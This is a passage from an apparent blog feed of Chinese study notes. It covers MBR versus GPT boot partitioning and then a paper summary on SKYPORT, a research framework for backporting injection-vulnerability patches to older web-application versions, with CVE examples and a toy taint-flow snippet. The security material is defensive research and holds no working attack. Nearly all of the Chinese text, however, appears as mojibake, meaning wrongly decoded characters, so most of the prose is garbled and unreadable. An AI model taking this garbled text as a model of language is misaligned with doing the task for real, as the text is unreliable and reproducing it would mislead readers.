‡å‡†ï¼ˆè¢«Intelç”¨äºæ›¿ä»£ä¸ªäººè®¡ç®—æœºçš„BIOSï¼‰çš„ä¸€éƒ¨åˆ†ï¼Œè¢«ç”¨äºæ›¿ä»£BIOSç³»ç»Ÿä¸­çš„ä¸€32bitsæ¥å­˜å‚¨é€»è¾‘å—åœ°å€å’Œå¤§å°ä¿¡æ¯çš„ä¸»å¼€æœºçºªå½•ï¼ˆMBRï¼‰åˆ†åŒºè¡¨ã€‚</li></ul><p>åœ¨å¯åŠ¨æ—¶ï¼š</p><p>MBRé‡Œé¢å­˜æ”¾ç€ç”µè„‘éœ€è¦ä»å“ªä¸ªç³»ç»Ÿå¯åŠ¨çš„ä¿¡æ¯ï¼Œç”µè„‘ä¾¿ä¼šè‡ªåŠ¨è½¬åˆ°ç³»ç»Ÿæ‰€åœ¨çš„åˆ†åŒºï¼Œç»§ç»­æ‰§è¡Œè¯¥åˆ†åŒºé‡Œçš„å¼•å¯¼ã€‚<br>å¯¹äºGPTï¼Œç”µè„‘ä¼šæ‰¾åˆ°ç¡¬ç›˜é‡Œç¬¬ä¸€ä¸ªFATæ ¼å¼ (æ¯”å¦‚ï¼šFAT32æ ¼å¼) çš„ä¸»åˆ†åŒºï¼Œé»˜è®¤è¯¥åˆ†åŒºä¸ºå¼•å¯¼æ‰€åœ¨ä½ç½®ã€‚è€Œä¸”ç”µè„‘ä¼šè¯»å–åˆ†åŒºé‡Œé¢çš„å›ºå®šçš„å¼•å¯¼æ–‡ä»¶ã€‚ ä½†GPTåˆ†åŒºè¡¨å¹¶ä¸æ˜¯å’ŒUEFIå¼ºç»‘å®šçš„ï¼Œå¹¶æ²¡æœ‰è§„èŒƒè¦æ±‚GPTåˆ†åŒºè¡¨çš„å­˜å‚¨è®¾å¤‡å¿…é¡»æœ‰ç¬¬ä¸€ä¸ªåˆ†åŒºä½œä¸º300MBçš„FAT32æ ¼å¼çš„EFIåˆ†åŒºï¼ŒGPTåˆ†åŒºè¡¨çš„å­˜å‚¨è®¾å¤‡å®Œå…¨å¯ä»¥æ˜¯Uç›˜ï¼Œå®Œå…¨å¯ä»¥æ²¡æœ‰EFIåˆ†åŒº</p><p>GPTç›¸è¾ƒäºMBRï¼š</p><ul><li>MBRæœ€å¤§åªæ”¯æŒ2TBçš„ç¡¬ç›˜ï¼ŒGPTæ²¡æœ‰æ­¤é™åˆ¶</li><li>MBRæœ€å¤§æ”¯æŒ4ä¸ªä¸»åˆ†åŒºï¼Œè¦æƒ³åˆ†æ›´å¤šåˆ†åŒºï¼Œéœ€è¦ä½¿ç”¨é€»è¾‘åˆ†åŒºï¼Œè€Œwindowsæ”¯æŒGPTæœ€å¤§128ä¸ªä¸»åˆ†åŒº</li><li>GPTçš„å¼•å¯¼æ›´åŠ é€æ˜ã€å¯æ§ï¼Œå¹¶ä¸”æ›´å¼ºå¤§</li></ul><p>å¯¹äºå†…æ ¸ä»£ç çš„æ‹‰èµ·ï¼š</p><p>macOSæ˜¯ç›´æ¥æ‹‰èµ·XNUå†…æ ¸ï¼ŒLinuxå’ŒWindowsä¸€èˆ¬è¿˜éœ€è¦OSæä¾›çš„bootloaderæ¥æ‹‰èµ·æ“ä½œç³»ç»Ÿå†…æ ¸</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ReadPaper3</title>
    <link href="/2023/10/31/ReadPaper3/"/>
    <url>/2023/10/31/ReadPaper3/</url>
    
    <content type="html"><![CDATA[<h2 id="Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches"><a href="#Backporting-Security-Patches-of-Web-Applications-A-Prototype-Design-and-Implementation-on-Injection-Vulnerability-Patches" class="headerlink" title="Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches"></a>Backporting Security Patches of Web Applications:A Prototype Design and Implementation on Injection Vulnerability Patches</h2><p>Webåº”ç”¨çš„åå‘å®‰å…¨è¡¥ä¸:æ³¨å…¥æ¼æ´è¡¥ä¸çš„åŸå‹è®¾è®¡å’Œå®ç°</p><p>ç”±å¤æ—¦å¤§å­¦å’Œçº¦ç¿°éœæ™®é‡‘æ–¯å¤§å­¦ç ”ç©¶äººå‘˜å…±åŒç ”ç©¶å®Œæˆ</p><h3 id="ç°çŠ¶"><a href="#ç°çŠ¶" class="headerlink" title="ç°çŠ¶"></a>ç°çŠ¶</h3><p>å¯¹äºä¿®å¤Webåº”ç”¨ç¨‹åºæ¼æ´ï¼Œé€šå¸¸çš„åšæ³•æ˜¯æ‰“è¡¥ä¸ï¼Œä½†ç°å®ä¸–ç•Œä¸­è¡¥ä¸çš„éƒ¨ç½²å­˜åœ¨æŒ‘æˆ˜</p><p>ä¾‹å¦‚ï¼šCVE-2018-7600çš„Drupalè¡¥ä¸å‘å¸ƒäº†ä¸‰ä¸ªæœˆï¼Œå¯¹äºè¿™ä¸ªä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œç ”ç©¶äººå‘˜å‘ç°å¤§çº¦æœ‰11500ä¸ªç½‘ç«™æ²¡æœ‰æ‰“è¡¥ä¸ã€‚</p><p>åŸå› ï¼š</p><p>å¾ˆå¤šæƒ…å†µä¸‹æ— æ³•å°†è¡¥ä¸ç›´æ¥åº”ç”¨äºæ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œå› ä¸ºWebåº”ç”¨ç¨‹åºç‰ˆæœ¬ä¸åŒ¹é…ã€‚å…·ä½“è€Œè¨€ï¼ŒWebåº”ç”¨ç¨‹åºå¼€å‘äººå‘˜åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹åªä¸ºæœ€æ–°ç‰ˆæœ¬æä¾›è¡¥ä¸ï¼Œä½†ç½‘ç«™ç»´æŠ¤è€…é€šå¸¸å› ä¸ºé—ç•™åŸå› è€Œè¿è¡Œæ—§ç‰ˆæœ¬ï¼Œä¾‹å¦‚ï¼Œè¯¥åº”ç”¨ç¨‹åºæ²¡æœ‰è‡ªåŠ¨æ›´æ–°ç•Œé¢æˆ–è€…ç½‘ç«™æœ‰ä¸€äº›é’ˆå¯¹æ—§ç‰ˆæœ¬å®šåˆ¶çš„ä»£ç ã€‚å› æ­¤ï¼Œç½‘ç«™ç»´æŠ¤è€…é¢ä¸´çš„ä¸€ä¸ªå®é™…é—®é¢˜æ˜¯åœ¨æ—§ç‰ˆæœ¬çš„è‡ªå·±çš„ç½‘ç«™ä¸Šåº”ç”¨é’ˆå¯¹æœ€æ–°ç‰ˆæœ¬çš„è¡¥ä¸ã€‚æ ¹æ®å‡ é¡¹å…ˆå‰çš„ç ”ç©¶ï¼Œä»–ä»¬é€šå¸¸ä¸æ„¿è¿™æ ·åšï¼Œå› ä¸ºä»–ä»¬ç¼ºä¹æŠ€æœ¯ç»éªŒï¼Œå¹¶å®³æ€•ç ´åç½‘ç«™åŠŸèƒ½ã€‚</p><h3 id="Backporting-security-patcheså®‰å…¨è¡¥ä¸åå‘ç§»æ¤"><a href="#Backporting-security-patcheså®‰å…¨è¡¥ä¸åå‘ç§»æ¤" class="headerlink" title="Backporting security patcheså®‰å…¨è¡¥ä¸åå‘ç§»æ¤"></a>Backporting security patcheså®‰å…¨è¡¥ä¸åå‘ç§»æ¤</h3><p>è·¨ç‰ˆæœ¬è¡¥ä¸éƒ¨ç½²çš„å®é™…é—®é¢˜å¯ä»¥å½¢å¼åŒ–ä¸ºä¸€ä¸ªç ”ç©¶é—®é¢˜ï¼Œå³å¦‚ä½•å°†ç‰¹å®šæ¼æ´çš„ç»™å®šå®‰å…¨è¡¥ä¸é€†å‘ç§»æ¤åˆ°ç›®æ ‡æ—§ç‰ˆæœ¬çš„Webåº”ç”¨ç¨‹åºï¼Œç®€ç§°ä¸ºå®‰å…¨è¡¥ä¸é€†å‘ç§»æ¤ã€‚</p><p>å®‰å…¨è¡¥ä¸é€†å‘ç§»æ¤çš„ä¸€èˆ¬ç›®æ ‡æ˜¯ç»´æŠ¤Webåº”ç”¨ç¨‹åºçš„ä¸¤ä¸ªé‡è¦å±æ€§ï¼š</p><p>ï¼ˆ1ï¼‰å®‰å…¨æ€§ï¼šå³èƒ½å¤ŸæŠµå¾¡ä¸æ¼æ´ç›¸å…³çš„æ”»å‡»</p><p>ï¼ˆ2ï¼‰å‘åå…¼å®¹æ€§ï¼šä¸å¼•å‘åˆ«çš„åŠŸèƒ½é—®é¢˜</p><p><strong>é€†å‘ç§»æ¤çš„å¯èƒ½æ€§ï¼š</strong></p><p>å®‰å…¨è¡¥ä¸çš„ç›®çš„æ˜¯ä½¿ç”¨å®‰å…¨é€»è¾‘æ¥æ›´æ–°Webåº”ç”¨ç¨‹åºä¸­ç»™å®šè¾“å…¥çš„è„†å¼±é€»è¾‘</p><p>é€†å‘ç§»æ¤æ˜¯å¯èƒ½çš„ï¼Œå› ä¸ºç›¸åŒçš„è„†å¼±é€»è¾‘ä¹Ÿå¯èƒ½å­˜åœ¨äºç›®æ ‡æ—§ç‰ˆæœ¬çš„Webåº”ç”¨ç¨‹åºä¸­</p><p>ï¼ˆè„†å¼±é€»è¾‘vulnerable logicï¼šåº”ç”¨ç¨‹åºä¸­å­˜åœ¨æ½œåœ¨æ¼æ´æˆ–è€…å®‰å…¨é—®é¢˜çš„éƒ¨åˆ†æˆ–ä»£ç ï¼‰</p><p><strong>é€†å‘ç§»æ¤çš„æŒ‘æˆ˜ï¼š</strong></p><ol><li>è¡¥ä¸å¯èƒ½ä¸ä»…ä»…æ›´æ–°è„†å¼±é€»è¾‘ï¼Œè¿˜å¯èƒ½å¼•å…¥å…¶ä»–æ–°åŠŸèƒ½ï¼Œä¾‹å¦‚æ·»åŠ æ–°è¾“å…¥ã€‚è¿™äº›æ–°åŠŸèƒ½å¯èƒ½åœ¨ç›®æ ‡æ—§ç‰ˆæœ¬ä¸Šæ— æ³•æ­£å¸¸å·¥ä½œï¼Œå¯¼è‡´å…¼å®¹æ€§é—®é¢˜ã€‚</li><li>ç›®æ ‡ç‰ˆæœ¬å¯èƒ½ä¸åŒ…å«ä¸è¡¥ä¸æ—¨åœ¨ä¿®å¤çš„è„†å¼±é€»è¾‘å®Œå…¨ç›¸åŒçš„å†…å®¹</li></ol><h3 id="SBPï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤è¡¥ä¸ï¼‰å’ŒSBVï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤ç‰ˆæœ¬ï¼‰"><a href="#SBPï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤è¡¥ä¸ï¼‰å’ŒSBVï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤ç‰ˆæœ¬ï¼‰" class="headerlink" title="SBPï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤è¡¥ä¸ï¼‰å’ŒSBVï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤ç‰ˆæœ¬ï¼‰"></a>SBPï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤è¡¥ä¸ï¼‰å’ŒSBVï¼ˆå¯å®‰å…¨é€†å‘ç§»æ¤ç‰ˆæœ¬ï¼‰</h3><p>SBPæ˜¯ä¸€ç§æ–°ç”Ÿæˆçš„è¡¥ä¸ï¼ŒåªåŒ…å«ä»åŸå§‹è¡¥ä¸ä¸­æå–çš„å®‰å…¨çš„ã€å¯ç¡®å®šè®¡ç®—çš„å®‰å…¨é€»è¾‘ï¼Œç”¨ä»¥æ›¿æ¢è„†å¼±é€»è¾‘ï¼›è€ŒSBVæ˜¯ä¸€ç§ç‰¹æ®Šçš„ç›®æ ‡ç‰ˆæœ¬ï¼Œå…·æœ‰ä¸SBPæ‰€é’ˆå¯¹çš„è„†å¼±é€»è¾‘ç›¸åŒçš„å†…å®¹ã€‚SBPå’ŒSBVçš„ç»„åˆå®ç°äº†å®‰å…¨å’Œå‘åå…¼å®¹æ€§çš„é€†å‘ç§»æ¤ç›®æ ‡ï¼Œå› ä¸ºSBPæ¶ˆé™¤äº†ä¸æ¼æ´æ— å…³çš„ä¿®å¤ï¼Œå¹¶ä¸”SBVç¡®ä¿ç›®æ ‡ä¸­çš„è„†å¼±é€»è¾‘ä¸åŸå§‹è¡¥ä¸æ‰€é’ˆå¯¹çš„è„†å¼±é€»è¾‘å®Œå…¨ç›¸åŒã€‚å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬æå‡ºçš„ä½¿ç”¨SBPå’ŒSBVè¿›è¡Œé€†å‘ç§»æ¤æ˜¯ä¸€ä¸ªä¸‰æ­¥æ–¹æ³•ã€‚é¦–å…ˆï¼Œå®ƒç¡®å®šåŸå§‹è¡¥ä¸æ˜¯å¦å¯é€†å‘ç§»æ¤ï¼Œç„¶åä»åº”ç”¨äº†åŸå§‹è¡¥ä¸çš„åæœŸç‰ˆæœ¬ç”ŸæˆSBPã€‚å…¶æ¬¡ï¼Œå®ƒæ£€æŸ¥ç›®æ ‡ç‰ˆæœ¬å¹¶ç¡®ä¿è¯¥ç‰ˆæœ¬æ˜¯SBVã€‚æœ€åï¼Œå®ƒç¡®å®šç›®æ ‡ç‰ˆæœ¬ä¸­çš„æ¼æ´ä½ç½®å¹¶åº”ç”¨SBPã€‚</p><h3 id="SKYPORTæ³¨å…¥æ¼æ´è¡¥ä¸é€†å‘ç§»æ¤æ¡†æ¶"><a href="#SKYPORTæ³¨å…¥æ¼æ´è¡¥ä¸é€†å‘ç§»æ¤æ¡†æ¶" class="headerlink" title="SKYPORTæ³¨å…¥æ¼æ´è¡¥ä¸é€†å‘ç§»æ¤æ¡†æ¶"></a>SKYPORTæ³¨å…¥æ¼æ´è¡¥ä¸é€†å‘ç§»æ¤æ¡†æ¶</h3><p>è™½ç„¶é€†å‘ç§»æ¤åœ¨ä¸»è§‚ä¸Šæ˜¯æœ‰æ•ˆçš„ï¼Œä½†ä¸»è¦æŒ‘æˆ˜åœ¨äºå¦‚ä½•ä»¥æ­£å¼çš„å¯æ¯”è¾ƒçš„æ–¹å¼è¡¨ç¤ºwebåº”ç”¨ç¨‹åºçš„å®‰å…¨é€»è¾‘å’Œè„†å¼±é€»è¾‘</p><p>åˆ©ç”¨sinkï¼ˆå±é™©å‡½æ•°ï¼‰ï¼šå¯èƒ½è§¦å‘å±é™©è¡Œä¸ºå¦‚æ–‡ä»¶æ“ä½œã€å‘½ä»¤æ‰§è¡Œã€æ•°æ®åº“æ“ä½œç­‰è¡Œä¸ºçš„å‡½æ•°</p><p>ä¾‹å¦‚ï¼šè·¨ç«™è„šæœ¬æ”»å‡»ä¸­çš„echo</p><p>ç ”ç©¶å›¢é˜Ÿè§‚å¯Ÿåˆ°ï¼Œsinkå‡½æ•°é€šå¸¸å­˜åœ¨ä¸è¡¥ä¸å‰ï¼Œè¡¥ä¸åå’Œç›®æ ‡ç‰ˆæœ¬ï¼Œè¿™ä¸€ç»“æœå¯å‘ç ”ç©¶å›¢é˜Ÿå¼€å‘äº†SKYPORTï¼Œè¿™ä¸€æ¡†æ¶å°†Webåº”ç”¨ç¨‹åºçš„å®‰å…¨å’Œè„†å¼±é€»è¾‘è¡¨ç¤ºä¸ºä¸€ç§ç§°ä¸ºâ€œsinkèƒ½åŠ›â€ï¼ˆsink capabilityï¼‰çš„æ¦‚å¿µ</p><p>ä¾‹å­ï¼šOpenEMRç‰ˆæœ¬5.0.1ä¹‹å‰çš„CVE2018-10572ï¼ˆä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼‰</p><p>diffï¼šdiffæ˜¯Unixç³»ç»Ÿçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å·¥å…·ç¨‹åºã€‚å®ƒç”¨æ¥æ¯”è¾ƒä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å·®å¼‚ï¼Œæ˜¯ä»£ç ç‰ˆæœ¬ç®¡ç†çš„åŸºçŸ³ä¹‹ä¸€ã€‚</p><p>å®˜æ–¹è¡¥ä¸ï¼š</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111205552.png" alt="image-20231108111205552"></p><p>ç”Ÿæˆçš„SBPï¼š</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111227472.png" alt="image-20231108111227472"></p><p>éƒ¨ç½²ï¼š</p><p><img src="/2023/10/31/ReadPaper3/image-20231108111307950.png" alt="image-20231108111307950"></p><p><strong>ä¸ºä»€ä¹ˆå­˜åœ¨æ¼æ´</strong>ï¼š</p><p>è¯»å–äº†ç”¨æˆ·è¾“å…¥$_GET[template]çš„æ–‡ä»¶ä½†æ²¡æœ‰è¿›è¡Œä»»ä½•æ£€æŸ¥</p><p><strong>ä¸ºä»€ä¹ˆé€†å‘ç§»æ¤è¿™ä¸ªè¡¥ä¸å…·æœ‰æŒ‘æˆ˜æ€§ï¼š</strong></p><p>è¡¥ä¸ä¸ä»…åŒ…å«ä¿®å¤æ¼æ´çš„ä»£ç ï¼ˆ12è¡Œï¼‰ï¼Œè¿˜åŒ…å«äº†ä¸æ¼æ´æ— å…³çš„ä»£ç ï¼ˆå¢åŠ çš„ç¬¬äºŒè¡Œç¬¬ä¸‰è¡Œï¼‰ï¼Œè¿™å¯èƒ½ä¼šå¼•å‘å‘åå…¼å®¹æ€§é—®é¢˜</p><p>åŒæ—¶ï¼Œå°†è¡¥ä¸åº”ç”¨åˆ°cä¸­æ‰€ç¤ºçš„ç›®æ ‡ç‰ˆæœ¬æ˜¯å…·æœ‰æŒ‘æˆ˜çš„ï¼Œå› ä¸ºå›¾aä¸­ç”¨äºç¡®å®šè¡¥ä¸ä½ç½®çš„ç¬¬äº”è¡Œæ²¡æœ‰å¼•å…¥åˆ°ç›®æ ‡ç‰ˆæœ¬</p><p><strong>å¦‚ä½•å°†è¡¥ä¸ä»5.0.0.6é€†å‘ç§»æ¤åˆ°5.0.0.5</strong></p><p>é¦–å…ˆï¼ŒS KY P ORTç”Ÿæˆä¸€ä¸ªå¯å®‰å…¨é€†å‘ç§»æ¤çš„è¡¥ä¸SBPï¼Œå¦‚å›¾bæ‰€ç¤ºï¼Œå…¶ä¸­åŒ…å«æ•´ä¸ªå®‰å…¨é€»è¾‘ï¼ŒåŒ…æ‹¬convert_safe_file_dir_name()å‡½æ•°ï¼Œå¹¶åˆ é™¤ä¸æ¼æ´æ— å…³çš„ä»£ç ã€‚å…¶æ¬¡ï¼ŒSKYPORTæ£€æŸ¥ç‰ˆæœ¬5.0.0.5æ˜¯å¦æ˜¯ä¸€ä¸ªå¯å®‰å…¨é€†å‘ç§»æ¤çš„ç‰ˆæœ¬ï¼ˆSBVï¼‰ï¼Œå› ä¸ºä¸¤ä¸ªç‰ˆæœ¬çš„è„†å¼±é€»è¾‘ï¼Œå³åœ¨å›¾1ï¼ˆaï¼‰å’Œï¼ˆcï¼‰ä¸­ç¬¬11è¡Œå¤„ä»¥sinkåŠŸèƒ½è¡¨ç¤ºçš„è„†å¼±é€»è¾‘ï¼Œæ˜¯ç›¸åŒçš„ã€‚æœ€åï¼ŒS KY P ORTå°†ç”Ÿæˆçš„SBPåº”ç”¨äºå›¾1ï¼ˆcï¼‰ä¸­çš„SBVï¼Œé€šè¿‡æ·»åŠ ä¸¤è¡Œå¤‡ä»½ä»£ç ï¼ˆç¬¬2è¡Œå’Œç¬¬3è¡Œï¼‰å¹¶å°†ç¬¬11è¡Œæ›¿æ¢ä¸ºç¬¬12è¡Œ</p><h4 id="Webåº”ç”¨ç¨‹åºçš„è„†å¼±é€»è¾‘è¡¨ç¤º"><a href="#Webåº”ç”¨ç¨‹åºçš„è„†å¼±é€»è¾‘è¡¨ç¤º" class="headerlink" title="Webåº”ç”¨ç¨‹åºçš„è„†å¼±é€»è¾‘è¡¨ç¤º"></a>Webåº”ç”¨ç¨‹åºçš„è„†å¼±é€»è¾‘è¡¨ç¤º</h4><p>Webåº”ç”¨ç¨‹åºçš„è„†å¼±é€»è¾‘å¯ä»¥è¡¨ç¤ºä¸ºä¸ç»™å®šç”¨æˆ·è¾“å…¥ç›¸å…³çš„æ‰€æœ‰æ§åˆ¶æµå’Œæ•°æ®æµã€‚æ¢å¥è¯è¯´ï¼Œä¸€ä¸ªç»è¿‡ç²¾å¿ƒè®¾è®¡çš„æ¶æ„è¾“å…¥å¯èƒ½ä¼šå¼•å‘éµå¾ªç‰¹å®šæ§åˆ¶æµå’Œæ•°æ®æµè·¯å¾„çš„è„†å¼±ç¨‹åºæ‰§è¡Œï¼Œä»è€Œå¯¼è‡´æ¶æ„åæœã€‚</p><p>å°†å¯¼è‡´æ±‡èšç‚¹å‡½æ•°çš„æ‰€æœ‰æ§åˆ¶æµè·¯å¾„ç§°ä¸ºæ±‡èšç‚¹æµï¼ˆsink flowsï¼‰ï¼Œå¹¶ç”¨ (flow1, flow2, â€¦) è¡¨ç¤º</p><p><img src="/2023/10/31/ReadPaper3/image-20231108140242515.png" alt="image-20231108140242515"></p><ul><li>Reach Conditionï¼ˆåˆ°è¾¾æ¡ä»¶ï¼‰ï¼šæ˜¯æ¶‰åŠåˆ°flow kçš„æ‰€æœ‰æ§åˆ¶æµæ¡ä»¶çš„é›†åˆ</li><li>DEï¼šæ¶‰åŠåˆ°flow kçš„å‚æ•°çš„ç¬¦å·è¡¨è¾¾å¼</li></ul><p>å°†ä¸åŒæ±‡èšç‚¹æµçš„æ‰€æœ‰ RC å’Œ DE æ”¾åœ¨ä¸€èµ·ï¼Œå¹¶å°†å®ƒä»¬å®šä¹‰ä¸ºè”åˆé›†ï¼ˆ{&lt;RC flow1, DE flow1&gt;, &lt;RC flow2, DE flow2&gt;, â€¦}ï¼‰ï¼Œä½œä¸ºæ±‡èšç‚¹èƒ½åŠ›ï¼ˆsink capabilityï¼‰ï¼Œè¡¨ç¤ºæ³¨å…¥æ¼æ´çš„è„†å¼±é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ($condition)<br>  $value = $input1<br><span class="hljs-keyword">else</span><br>  $value = $input2<br><br>sink_func($value + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>æœ‰ä¸¤ä¸ªsink flowsï¼Œä¸€ä¸ªæ¥è‡ªifåˆ†æ”¯ï¼Œè®°ä½œflow1ï¼Œä¸€ä¸ªæ¥è‡ªelseåˆ†æ”¯ï¼Œè®°ä½œflow2</p><p>flow1çš„RC ï¼š{$condition} , DE:{$input1+1}</p><p>flow2çš„RC : {$condition}, DE:{$input2+1}</p><p><img src="/2023/10/31/ReadPaper3/image-20231108153958177.png" alt="image-20231108153958177"></p><h4 id="è¡¥ä¸å½±å“åˆ†æ"><a href="#è¡¥ä¸å½±å“åˆ†æ" class="headerlink" title="è¡¥ä¸å½±å“åˆ†æ"></a>è¡¥ä¸å½±å“åˆ†æ</h4><p><strong>é¦–å…ˆåˆ©ç”¨å‰å‘åˆ†æå®šä½å—å½±å“çš„è¡Œ</strong></p><p>SKYPORTä»è¡¥ä¸çš„æ›´æ”¹å¼€å§‹æ‰§è¡Œå‰å‘æ±¡ç‚¹åˆ†æï¼Œå¹¶ä½¿ç”¨å—å½±å“çš„è¡Œä¸­çš„å—å½±å“çš„å˜é‡æŸ¥è¯¢ç¨‹åºä¾èµ–å›¾ï¼ˆç”¨äºæè¿°ç¨‹åºä¸­å„ä¸ªå…ƒç´ ä¹‹é—´çš„ä¾èµ–å…³ç³»å’Œæ§åˆ¶æµå…³ç³»ï¼‰</p><p>è¯¥åˆ†æåŒ…æ‹¬å¯èƒ½å½±å“æ±‡èšç‚¹å‡½æ•°çš„è¾¾åˆ°æ¡ä»¶æˆ–æ•°æ®æµè¡¨è¾¾å¼çš„ä¸‰ç§ç±»å‹çš„è¯­å¥ï¼Œå¹¶æ’é™¤å…¶ä»–æ— å…³çš„è¯­å¥ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸‰ç§ç±»å‹çš„è¯­å¥åŒ…æ‹¬èµ‹å€¼è¯­å¥ï¼ˆå½±å“æ•°æ®æµè¡¨è¾¾å¼ï¼‰ã€æ¡ä»¶è¯­å¥ï¼ˆå½±å“è¾¾åˆ°æ¡ä»¶ï¼‰å’Œé€€å‡ºè¯­å¥ï¼ˆå½±å“è¾¾åˆ°æ¡ä»¶ï¼‰</p><p><strong>ä»å—å½±å“çš„è¡Œä¸­è¯†åˆ«æ±‡èšç‚¹å‡½æ•°</strong>sink</p><p>åŸºäºå¼€å‘è€…åˆ›å»ºçš„sinkå‡½æ•°å’Œæ¼æ´ç±»å‹ä¹‹é—´çš„æ˜ å°„</p><p>è‹¥æœ‰äº›sinkå‡½æ•°æ˜¯å¼€å‘äººå‘˜è‡ªå®šä¹‰çš„ï¼Œé‚£ä¹ˆå°±æ‰§è¡Œä»£ç å¯è¾¾æ€§åˆ†ææ¥æ‰¾åˆ°æœ€ç»ˆçš„sinkå‡½æ•°</p><p>ä»£ç å¯è¾¾æ€§åˆ†æï¼šç”¨äºç¡®å®šç¨‹åºä¸­çš„å“ªäº›ä»£ç éƒ¨åˆ†å¯ä»¥åœ¨ä¸åŒçš„æ‰§è¡Œè·¯å¾„ä¸Šè¢«è®¿é—®æˆ–æ‰§è¡Œ</p><p><img src="/2023/10/31/ReadPaper3/image-20231108150345617.png" alt="image-20231108150345617"></p><h4 id="æ±‡èšç‚¹èƒ½åŠ›æå–"><a href="#æ±‡èšç‚¹èƒ½åŠ›æå–" class="headerlink" title="æ±‡èšç‚¹èƒ½åŠ›æå–"></a>æ±‡èšç‚¹èƒ½åŠ›æå–</h4><p>æ¥æ”¶æ±‡èšç‚¹å‡½æ•°çš„åˆ—è¡¨å’Œç»™å®šç‰ˆæœ¬çš„Webåº”ç”¨ç¨‹åºï¼Œç„¶åè®¡ç®—æ‰€æœ‰æ±‡èšç‚¹å‡½æ•°çš„æ±‡èšç‚¹èƒ½åŠ›ï¼ˆSink capabilityï¼Œç®€ç§°SCï¼‰</p><p>è¯¦ç»†æ¥è¯´ï¼š</p><p>é¦–å…ˆï¼ŒSKYPORT æ‰§è¡Œå‰å‘è·¯å¾„æ¢ç´¢ï¼Œä»å…¥å£ç‚¹æˆ–è°ƒç”¨è€…å‡½æ•°å¼€å§‹ï¼Œæ²¿ç€æ§åˆ¶æµè¾¹ç¼˜è¿½è¸ªï¼Œç›´åˆ°è¾¾åˆ°æä¾›çš„æ±‡èšç‚¹å‡½æ•°ã€‚åœ¨æ¢ç´¢è¿‡ç¨‹ä¸­ï¼ŒSKYPORT è¿˜ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨é€€å‡ºè¯­å¥ï¼Œä¾‹å¦‚die()ï¼Œå¹¶åœæ­¢æ¢ç´¢ã€‚å¦‚æœ SKYPORT é‡åˆ°ä¸€ä¸ªå¾ªç¯ï¼Œå®ƒä¼šå±•å¼€ä¸€æ¬¡å¾ªç¯ä»¥é¿å…è·¯å¾„çˆ†ç‚¸ã€‚</p><p>å…¶æ¬¡ï¼ŒSKYPORT é€šè¿‡ç¬¦å·è·Ÿè¸ªæ ¹æ®æ ‘åœ°å€ä»£ç ï¼ˆTACï¼‰å…¬å¼è®¡ç®—RCå’ŒDEï¼Œç„¶åè”åˆæˆSCï¼š&lt;RC, DE&gt;</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TAC æ˜¯ &quot;Tree Address Code&quot; çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§ä¸­é—´è¡¨ç¤ºï¼ˆIntermediate Representationï¼‰çš„å½¢å¼ï¼Œé€šå¸¸ç”¨äºç¼–ç¨‹è¯­è¨€ç¼–è¯‘å™¨å’Œé™æ€ä»£ç åˆ†æå™¨ä¸­ã€‚<br><br>TAC æ˜¯ä¸€ç§æ ‘çŠ¶ç»“æ„ï¼Œç”¨äºè¡¨ç¤ºç¨‹åºçš„æ§åˆ¶æµå’Œæ•°æ®æµã€‚å®ƒé€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å…ƒç´ ï¼š<br><br><span class="hljs-bullet">1.</span> æ“ä½œç¬¦ï¼ˆOperatorsï¼‰ï¼šè¡¨ç¤ºæ‰§è¡Œçš„æ“ä½œï¼Œä¾‹å¦‚åŠ æ³•ã€å‡æ³•ã€ä¹˜æ³•ã€èµ‹å€¼ç­‰ã€‚<br><span class="hljs-bullet">2.</span> æ“ä½œæ•°ï¼ˆOperandsï¼‰ï¼šå‚ä¸æ“ä½œçš„å˜é‡ã€å¸¸æ•°æˆ–è¡¨è¾¾å¼ã€‚<br><span class="hljs-bullet">3.</span> è¡¨è¾¾å¼æ ‘ï¼ˆExpression Treeï¼‰ï¼šç”¨äºè¡¨ç¤ºå¤æ‚çš„è¡¨è¾¾å¼ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹ä»£è¡¨ä¸€ä¸ªæ“ä½œç¬¦ï¼Œè€Œå­èŠ‚ç‚¹ä»£è¡¨æ“ä½œæ•°æˆ–å…¶ä»–å­è¡¨è¾¾å¼ã€‚<br><span class="hljs-bullet">4.</span> æ¡ä»¶è¯­å¥ï¼ˆConditional Statementsï¼‰ï¼šç”¨äºè¡¨ç¤ºåˆ†æ”¯å’Œæ¡ä»¶æ§åˆ¶ç»“æ„ï¼Œå¦‚ if è¯­å¥ã€while å¾ªç¯ç­‰ã€‚<br><span class="hljs-bullet">5.</span> æ 